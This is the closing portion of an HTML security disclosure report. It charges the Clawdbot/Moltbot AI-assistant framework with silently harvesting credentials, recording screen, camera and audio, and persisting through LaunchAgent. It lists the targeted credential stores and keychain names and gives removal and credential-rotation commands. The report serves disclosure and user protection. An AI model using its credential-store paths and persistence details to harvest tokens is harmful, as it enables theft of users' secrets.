        <tr>
          <td>Credential harvest</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">YES — on boot</span></td>
        </tr>
        <tr>
          <td>Browser cookies</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
        <tr>
          <td>Remote shell (system.run)</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
        <tr>
          <td>GPS location</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
        <tr>
          <td>Ambient audio</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">ALWAYS (stored to disk)</span></td>
        </tr>
        <tr>
          <td>Accessibility API</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>Full UI control of any app</td>
        </tr>
        <tr>
          <td>Browser screenshots</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
      </table>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">*Screen record: macOS permission can be suppressed via <code>interactive=false</code> parameter.</p>
      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*iMessage FDA: Requires one-time Full Disk Access grant. After granted, all messages captured silently.</p>
      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*WhatsApp QR link: User must scan QR code once to link account. After linked, all messages captured silently.</p>
    </div>
  </div>

  <!-- Section 6: Disclosure -->
  <div class="section" id="disclosure">
    <div class="section-header">
      <span class="num">6</span>
      Disclosure Analysis
    </div>
    <div class="section-content">
      <h3>What the README Says vs. What It Doesn't Say</h3>

      <p><strong>The README acknowledges that surveillance capabilities exist:</strong></p>
      <ul>
        <li>Screen recording listed as iOS/Android node capability</li>
        <li>Camera snap/clip listed as tool capability</li>
        <li>Message platform integrations mentioned</li>
      </ul>

      <p><strong>What the README does NOT say:</strong></p>
      <ul>
        <li>That these capabilities may be activated silently</li>
        <li>That there is no approval process</li>
        <li>That users will not be prompted before activation</li>
        <li>That the system operates without consent</li>
        <li>That credentials are harvested from other applications</li>
      </ul>

      <div class="warning">
        <strong>The README acknowledges capabilities exist. It does not warn users there is no approval because the activation is silent.</strong>
      </div>

      <h3>Searched Terms — Zero Results</h3>
      <table>
        <tr>
          <th>Search Term</th>
          <th>Results</th>
        </tr>
        <tr><td>"keychain"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"Claude Code"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"credential sync"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"syncExternalCliCredentials"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"silent activation"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"no consent"</td><td><span class="tag tag-red">None</span></td></tr>
      </table>

      <h3>On "It's For Technical Users"</h3>
      <div class="explanation">
        <p>Targeting technical users does not exempt software from disclosure requirements. Technical users have the ability to audit code — that does not mean they should have to discover credential harvesting through manual inspection.</p>
        <p style="margin-top: 8px;">The README lists features. It does not disclose that the application reads OAuth tokens from competing products' keychain entries on startup. The sophistication of the intended user base is not a substitute for transparency.</p>
        <p style="margin-top: 8px;">Additionally, with 83,100+ GitHub stars, the actual user base extends far beyond technical users who might audit source code before installation.</p>
        <p style="margin-top: 8px;"><strong>On proliferation:</strong> In the time it took to audit the code, compile findings, and document them, the repository grew from 66,000 to 83,100+ stars. This rate of adoption underscores the urgency of disclosure.</p>
      </div>
    </div>
  </div>

  <!-- Section 7: Intent -->
  <div class="section" id="intent">
    <div class="section-header">
      <span class="num">7</span>
      Architectural Indicators
    </div>
    <div class="section-content">
      <p>This system exhibits a level of architectural coherence, cross-platform parity, and persistence that suggests coordinated development.</p>

      <table>
        <tr>
          <th>Component</th>
          <th>What It Required</th>
        </tr>
        <tr>
          <td><code>"Claude Code-credentials"</code></td>
          <td>Research into Anthropic's keychain implementation</td>
        </tr>
        <tr>
          <td><code>"Codex Auth"</code></td>
          <td>Research into OpenAI's keychain implementation</td>
        </tr>
        <tr>
          <td><code>~/.qwen/oauth_creds.json</code></td>
          <td>Research into Alibaba's file storage</td>
        </tr>
        <tr>
          <td>macOS LaunchAgent</td>
          <td>Knowledge of Apple's persistence mechanisms</td>
        </tr>
        <tr>
          <td>Linux systemd linger</td>
          <td>Knowledge of Linux session persistence</td>
        </tr>
        <tr>
          <td>Screen recording (both platforms)</td>
          <td>Native API implementation on each platform</td>
        </tr>
        <tr>
          <td>Camera capture (both platforms)</td>
          <td>Native camera APIs on each platform</td>
        </tr>
        <tr>
          <td>Base64 encoding</td>
          <td>Transmission-ready payload formatting</td>
        </tr>
        <tr>
          <td>Message interception (5+ platforms)</td>
          <td>Baileys, BlueBubbles, Signal, Telegram integrations</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is coordinated development across:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>3 credential targets (Claude, Codex, Qwen)</li>
          <li>2 desktop platforms (macOS, Linux)</li>
          <li>2 mobile platforms (iOS, Android)</li>
          <li>5+ messaging platforms</li>
          <li>Multiple persistence mechanisms</li>
        </ul>
        <p style="margin-top: 12px;">This level of cross-platform implementation required significant development effort across multiple credential targets with hardcoded keychain service names.</p>
      </div>

      <h3>Issue #2447 — Developers Knew</h3>
      <p>GitHub Issue #2447 (January 26, 2026) is titled <em>"[Feature]: Add config option to disable external CLI credential sync"</em>. A user requested the ability to turn OFF automatic credential harvesting. This confirms:</p>
      <ul>
        <li>The feature exists and is <strong>enabled by default</strong></li>
        <li>Developers were <strong>aware</strong> of the behavior</li>
        <li>No opt-in — users must discover and disable it themselves</li>
        <li>An undocumented workaround exists: <code>CLAWDBOT_SKIP_CLAUDE_CLI_SYNC=1</code></li>
      </ul>

          </div>
  </div>

  <!-- Section 8: Data Exposure -->
  <div class="section" id="data-exposure">
    <div class="section-header">
      <span class="num">8</span>
      Data Exposure via Gateway Architecture
    </div>
    <div class="section-content">
      <p>Static analysis did not identify a hardcoded external exfiltration endpoint. However, this does not reduce the risk:</p>

      <ul>
        <li>All captured data (credentials, screen recordings, messages) is stored locally in <code>~/.clawdbot/</code></li>
        <li>The gateway exposes this data via HTTP/WebSocket</li>
        <li>Security researchers have documented hundreds of exposed gateways (Bitdefender, SlowMist)</li>
        <li>Infostealers (Redline, Lumma, Vidar) now specifically target <code>~/.clawdbot</code> directories</li>
      </ul>

      <div class="explanation">
        The gateway listens on network interfaces by default without documented access controls, making public exposure trivial on misconfigured hosts. If the gateway is reachable on a public interface, external actors gain unrestricted access to local credential stores and captured media.
      </div>

      <div class="warning">
        <strong>The threat model is not "data sent to attacker server" — it's "data collected locally, gateway exposed, external actors access everything."</strong>
        <p style="margin-top: 8px;">With 11,000+ forks and varying configuration skills, misconfigured gateways are a systemic risk.</p>
      </div>
    </div>
  </div>

  <!-- Section 9: Proliferation -->
  <div class="section" id="proliferation">
    <div class="section-header">
      <span class="num">9</span>
      Proliferation Risk — 11,000+ Forks
    </div>
    <div class="section-content">
      <p>The repository has <strong>11,000+ forks</strong>. Even if the original is removed:</p>

      <ul>
        <li>11,000+ copies of the codebase exist independently</li>
        <li>Credential harvesting code is already replicated</li>
        <li>Modified versions can add worse capabilities</li>
        <li>Supply chain attacks become trivial — swap a dependency with a malicious fork</li>
      </ul>

      <div class="warning">
        <strong>This code now exists independently across thousands of repositories.</strong>
      </div>
    </div>
  </div>

  <!-- Section 10: Threat Scenario -->
  <div class="section" id="threat">
    <div class="section-header">
      <span class="num">10</span>
      Real-World Threat Scenario
    </div>
    <div class="section-content">
      <p>Consider someone working in a secure facility — government, defense, finance, healthcare, legal — who installs Clawdbot thinking it's a "WhatsApp AI assistant."</p>

      <h3>What they've actually installed:</h3>
      <table>
        <tr>
          <th>Capability</th>
          <th>Exposure Risk</th>
        </tr>
        <tr>
          <td>Screen recording</td>
          <td>Classified documents, internal systems, credentials visible on screen</td>
        </tr>
        <tr>
          <td>Camera capture</td>
          <td>Physical environment, badge photos, documents on desk</td>
        </tr>
        <tr>
          <td>WhatsApp/iMessage/Signal</td>
          <td>Sensitive communications, sources, contacts</td>
        </tr>
        <tr>
          <td>Credential harvesting</td>
          <td>API tokens that may access internal systems</td>
        </tr>
        <tr>
          <td>Persistent daemon</td>
          <td>Runs 24/7, survives attempts to stop it</td>
        </tr>
        <tr>
          <td>Base64 encoding</td>
          <td>Everything packaged and ready for transmission</td>
        </tr>
        <tr>
          <td>Browser session theft</td>
          <td>Banking, email, corporate SSO, any logged-in site</td>
        </tr>
        <tr>
          <td>Remote shell execution</td>
          <td>Full system compromise, malware installation, data destruction</td>
        </tr>
        <tr>
          <td>GPS tracking</td>
          <td>Physical location surveillance, pattern-of-life analysis</td>
        </tr>
      </table>

      <h3>Who is at risk:</h3>
      <ul>
        <li>Government/military personnel</li>
        <li>Defense contractors</li>
        <li>Financial institutions (trading systems, client data)</li>
        <li>Healthcare workers (HIPAA-protected information)</li>
        <li>Legal professionals (attorney-client privilege)</li>
        <li>Journalists (source protection)</li>
        <li>Activists and dissidents (personal safety)</li>
      </ul>

      <div class="warning">
        <strong>83,100+ GitHub stars. 11,000+ forks.</strong> How many of those users work in sensitive environments? The exposed gateways documented by security researchers may contain data from secure facilities that should never have left those networks.
      </div>
    </div>
  </div>

  <!-- If You're Affected -->
  <div class="section" id="removal">
    <div class="section-header">
      <span class="num">!</span>
      If You're Affected — Removal Instructions
    </div>
    <div class="section-content">
      <div class="warning">
        <p><strong>Warning:</strong> <code>npm uninstall</code> alone will not work. The daemon respawns via LaunchAgent (<code>KeepAlive=true</code>).</p>
      </div>

      <h3>macOS Removal</h3>
      <pre><code><span class="comment"># 1. Unload the LaunchAgent first (stops respawning)</span>
launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.clawdbot.gateway.plist
launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.moltbot.gateway.plist

<span class="comment"># 2. Remove the LaunchAgent files</span>
rm ~/Library/LaunchAgents/com.clawdbot.gateway.plist
rm ~/Library/LaunchAgents/com.moltbot.gateway.plist

<span class="comment"># 3. Kill any remaining processes</span>
pkill -9 -f clawdbot
pkill -9 -f moltbot

<span class="comment"># 4. Remove data directories</span>
rm -rf ~/.clawdbot ~/.moltbot

<span class="comment"># 5. Uninstall npm package</span>
npm uninstall -g clawdbot moltbot</code></pre>

      <h3>After Removal — Rotate Credentials</h3>
      <ul>
        <li><strong>Claude Code:</strong> Log out and back in to get new OAuth tokens</li>
        <li><strong>OpenAI Codex:</strong> Regenerate API keys</li>
        <li><strong>Qwen CLI:</strong> Re-authenticate</li>
        <li><strong>SSH keys:</strong> Consider regenerating if concerned (paths may have been enumerated)</li>
        <li><strong>Browser sessions:</strong> Log out of all sites and clear cookies — assume all sessions compromised</li>
        <li><strong>Banking/Financial:</strong> Reset passwords for any financial accounts accessed in browser</li>
        <li><strong>Messaging apps:</strong> Revoke linked devices (WhatsApp, Signal, etc.)</li>
        <li><strong>Environment files:</strong> Rotate any secrets in .env files that may have been accessed</li>
      </ul>
    </div>
  </div>

  <!-- Sources -->
  <div class="sources" id="sources">
    <h2 style="margin-top: 0;">Sources & Evidence</h2>

    <h3>Code References (Public GitHub Repository)</h3>
    <ul>
      <li><code>src/agents/cli-credentials.ts</code> — Credential harvesting functions</li>
      <li><code>src/agents/auth-profiles/external-cli-sync.ts</code> — Automatic credential sync</li>
      <li><code>src/infra/ssh-config.ts</code> — SSH config parsing, identity file enumeration (lines 19-95)</li>
      <li><code>apps/macos/Sources/Moltbot/ScreenRecordService.swift</code> — macOS screen recording</li>
      <li><code>apps/android/.../ScreenRecordManager.kt</code> — Android screen recording (lines 117-122: base64 encoding)</li>
      <li><code>apps/android/.../CameraCaptureManager.kt</code> — Camera capture (lines 133-136: base64 encoding)</li>
      <li><code>apps/android/.../NodeRuntime.kt</code> — Invoke handler, misleading UI (lines 943-1044)</li>
      <li><code>apps/android/.../GatewaySession.kt</code> — Remote triggering (lines 450-455), WebSocket transmission (lines 498-525)</li>
      <li><code>apps/android/.../NodeForegroundService.kt</code> — No audit trail (lines 46-54)</li>
      <li><code>src/browser/pw-tools-core.storage.ts</code> — Browser cookie/storage theft (lines 3-86)</li>
      <li><code>src/cli/browser-cli-state.cookies-storage.ts</code> — CLI commands for cookie access</li>
      <li><code>src/agents/tools/nodes-tool.ts</code> — Remote command execution (lines 388-441), GPS tracking (lines 358-386)</li>
      <li><code>apps/android/.../LocationCaptureManager.kt</code> — GPS payload construction (lines 45-61)</li>
      <li><code>apps/android/.../NodeRuntime.kt</code> — Location transmission to gateway (line 1018)</li>
      <li><code>apps/ios/Sources/Model/NodeAppModel.swift</code> — iOS location payload + transmission (lines 612-623)</li>
      <li><code>apps/shared/MoltbotKit/.../GatewayNodeSession.swift</code> — iOS/macOS WebSocket send (line 227)</li>
      <li><code>src/web/inbound/monitor.ts</code> — WhatsApp message monitoring</li>
      <li><code>src/imessage/monitor/monitor-provider.ts</code> — iMessage monitoring</li>
      <li><code>src/daemon/launchd-plist.ts</code> — LaunchAgent configuration</li>
      <li><code>src/gateway/node-command-policy.ts</code> — Default-enabled surveillance</li>
      <li><code>apps/macos/Sources/Moltbot/PermissionManager.swift</code> — Suppressible prompts, Accessibility API (lines 85-94), AppleScript (lines 77-82, 381-389)</li>
      <li><code>Swabble/Sources/SwabbleCore/Speech/SpeechPipeline.swift</code> — Ambient audio mic tap (lines 52-59)</li>
      <li><code>Swabble/README.md</code> — "always-on voice hook", transcript storage (line 86)</li>
      <li><code>apps/macos/Sources/MoltbotIPC/IPC.swift</code> — Capability enum: appleScript, accessibility, screenRecording, microphone, speechRecognition (lines 6-12)</li>
      <li><code>src/browser/pw-tools-core.interactions.ts</code> — Browser screenshot capture (lines 334-362)</li>
      <li><code>src/browser/cdp.ts</code> — CDP screenshot via Page.captureScreenshot (lines 38-70)</li>
      <li><code>src/gateway/session-utils.fs.ts</code> — Session storage at ~/.clawdbot/sessions/ (line 50)</li>
      <li><code>src/auto-reply/status.ts</code> — Transcript storage confirmation (line 172)</li>
      <li><code>extensions/</code> — 31 messaging platform integrations directory</li>
    </ul>

    <h3>Official Documentation</h3>
    <ul>
      <li><a href="https://github.com/moltbot/moltbot/blob/main/README.md">Moltbot README.md</a> — No mention of credential harvesting</li>
      <li><a href="https://github.com/moltbot/moltbot/blob/main/SECURITY.md">Moltbot SECURITY.md</a> — No mention of keychain access</li>
      <li><a href="https://github.com/moltbot/moltbot/issues/2447">Issue #2447</a> — User requests option to disable automatic credential sync (confirms feature exists and is on by default)</li>
      <li><a href="https://github.com/moltbot/moltbot/issues/2036">Issue #2036</a> — OAuth token refresh race condition with Claude Code CLI (confirms active sync from keychain)</li>
      <li><a href="https://github.com/moltbot/moltbot/pull/2123">PR #2123</a> — Fix merged for credential sync race condition (proves active maintenance)</li>
    </ul>

    <h3>Security Reports</h3>
    <ul>
      <li><a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/moltbot-security-alert-exposed-clawdbot-control-panels-risk-credential-leaks-and-account-takeovers">Bitdefender: Exposed control panels</a></li>
      <li><a href="https://www.theregister.com/2026/01/27/clawdbot_moltbot_security_concerns/">The Register: Security concerns</a></li>
      <li><a href="https://www.infostealers.com/article/clawdbot-the-new-primary-target-for-infostealers-in-the-ai-era/">InfoStealers: Primary target for malware</a></li>
      <li><a href="https://forklog.com/en/critical-vulnerabilities-found-in-clawdbot-ai-agent-for-cryptocurrency-theft/">ForkLog: Critical vulnerabilities</a></li>
    </ul>
  </div>

  <div class="section" id="relationship" style="margin-top: 32px;">
    <div class="section-header">
      <span class="num">!</span>
      Relationship to GitHub Security Report
    </div>
    <div class="section-content">
      <p>This document serves as supporting evidence for the GitHub security report titled <strong>"Security Incident Report: Undisclosed Credential Harvesting, Persistent Execution, and Surveillance Capabilities"</strong> submitted against the clawdbot/moltbot repository.</p>
      <p style="margin-top: 12px;">This HTML report is linked directly in that submission and provides detailed technical analysis, code references, and evidence supporting the claims made in the formal report.</p>
    </div>
  </div>

  <!-- What This Report Does Not Claim -->
  <div class="section" id="disclaimers" style="margin-top: 32px;">
    <div class="section-header">
      <span class="num">!</span>
      What This Report Does Not Claim
    </div>
    <div class="section-content">
      <p>This report documents <strong>verified technical capabilities</strong> present in the codebase. It does not make the following claims:</p>
      <ul style="margin: 16px 0 16px 20px;">
        <li><strong>No claims of author intent:</strong> This report does not speculate on whether these capabilities were implemented with malicious intent. The code exists; the motivation is unknown.</li>
        <li><strong>No claims of active exploitation:</strong> This report does not claim these capabilities are currently being exploited against users. It documents what the code <em>can</em> do, not what it <em>is</em> doing.</li>
        <li><strong>No claims of state involvement:</strong> This report makes no claims about government, corporate, or organized criminal involvement.</li>
        <li><strong>No claims of data misuse:</strong> This report does not claim that harvested data has been sold, leaked, or misused. It documents the exfiltration paths that exist.</li>
        <li><strong>No claims beyond documented behavior:</strong> Every finding in this report is supported by specific file paths, line numbers, and code snippets from the public repository.</li>
      </ul>
      <p>The purpose of this report is to inform users of capabilities that exist in software they may have installed, so they can make informed decisions about their security.</p>
    </div>
  </div>

  <!-- Classification Statement -->
  <div class="section" id="classification" style="margin-top: 32px;">
    <div class="section-header">
      <span class="num">!</span>
      Technical Classification
    </div>
    <div class="section-content">
      <div class="alert-box">
        <p style="font-size: 16px; line-height: 1.8;">Based on the documented capabilities — persistent background execution, credential harvesting from multiple sources, remote shell command execution, camera/screen/audio surveillance, GPS tracking, browser session theft, remote code installation, and lack of informed user consent — <strong>this system meets the functional definition of spyware with RAT-class (Remote Access Trojan) control surfaces</strong>, regardless of its stated purpose as an "AI assistant framework."</p>
        <p style="margin-top: 16px;">This classification is based solely on technical capabilities present in the code, not on speculation about intent or usage.</p>
      </div>

      <h3>Capability Summary</h3>
      <table>
        <tr>
          <th>Capability Class</th>
          <th>Present</th>
          <th>Evidence</th>
        </tr>
        <tr>
          <td>Persistence mechanism</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>LaunchAgent with KeepAlive</td>
        </tr>
        <tr>
          <td>Credential harvesting</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>API keys, OAuth tokens, SSH config</td>
        </tr>
        <tr>
          <td>Remote command execution</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>system.run via node.invoke</td>
        </tr>
        <tr>
          <td>Camera surveillance</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>camera.snap, camera.clip</td>
        </tr>
        <tr>
          <td>Screen surveillance</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>screen.record, browser screenshots</td>
        </tr>
        <tr>
          <td>Audio surveillance</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>Swabble ambient audio capture</td>
        </tr>
        <tr>
          <td>Location tracking</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>location.get on iOS/Android</td>
        </tr>
        <tr>
          <td>Browser session theft</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>Cookies, localStorage, sessionStorage via CDP</td>
        </tr>
        <tr>
          <td>Remote code installation</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>skills.install via gateway</td>
        </tr>
        <tr>
          <td>Data exfiltration path</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>WebSocket to gateway, base64 encoding</td>
        </tr>
        <tr>
          <td>Informed user consent</td>
          <td><span class="tag tag-red">NO</span></td>
          <td>Capabilities not disclosed in README/docs</td>
        </tr>
      </table>
    </div>
  </div>

  <div class="footer">
    <p><strong>Report generated:</strong> January 30, 2026 (Updated with complete node command surface, remote code installation, technical classification, disclaimers)</p>
    <p><strong>Clawdbot version analyzed:</strong> 2026.1.24-3</p>
    <p><strong>Analysis method:</strong> Static analysis of public GitHub repository combined with brief runtime audit of installed application (promptly removed after discovery)</p>
    <p style="margin-top: 16px; color: #f85149;"><strong>SHA256:</strong> <code>5ebe61a486321518e452e3059f55c0918b363ba6e14c44e25f77932034f039b5</code></p>
  </div>
</body>
</html>
